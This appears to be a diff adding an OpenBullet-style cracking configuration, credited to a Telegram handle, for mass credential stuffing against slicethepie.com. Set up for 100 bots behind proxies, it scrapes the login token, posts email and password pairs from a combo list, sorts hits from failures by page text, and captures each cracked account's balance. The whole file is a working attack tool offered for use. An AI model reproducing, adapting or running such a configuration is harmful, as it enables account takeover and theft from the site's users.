@@ -1,0 +1,94 @@
+[SETTINGS]
+{
+  "Name": "slicethepie",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2022-03-19T23:17:17.2147089+02:00",
+  "AdditionalInfo": "https://t.me/Koko_Nader",
+  "Author": "𝙶𝙴𝙾𝚁𝙶𝙴 𝙽𝙰𝙳𝙴𝚁 (🔥)/@Koko_Nader",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#get REQUEST GET "https://www.slicethepie.com/login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#tok PARSE "<SOURCE>" LR "input type=\"hidden\" name=\"_token\" value=\"" "\"" -> VAR "tok" 
+
+REQUEST POST "https://www.slicethepie.com/login" 
+  CONTENT "_token=&_token=<tok>&validation=token&location%5Blatitude%5D=&location%5Blongitude%5D=&email=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER ": scheme: https" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en,fr-FR;q=0.9,fr;q=0.8,en-US;q=0.7" 
+  HEADER "cache-control: max-age=0" 
+  HEADER "content-length: 179" 
+  HEADER "content-type: application/x-www-form-urlencoded" 
+  HEADER "origin: https://www.slicethepie.com" 
+  HEADER "referer: https://www.slicethepie.com/login" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"Google Chrome\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<ADDRESS>" Contains "https://www.slicethepie.com/review" 
+    KEY "<span>Log out</span>" 
+  KEYCHAIN Failure OR 
+    KEY "<ADDRESS>" Contains "https://www.slicethepie.com/login" 
+    KEY "<p class=\"light\"> Invalid email or password. </p" 
+
+#BL PARSE "<SOURCE>" LR "h4>Your balance is " "</h4>" CreateEmpty=FALSE -> CAP "Balance" 
+
+FUNCTION Constant "𝙶𝙴𝙾𝚁𝙶𝙴 𝙽𝙰𝙳𝙴𝚁 (🔥)/@Koko_Nader" -> CAP "Checked By" 
+
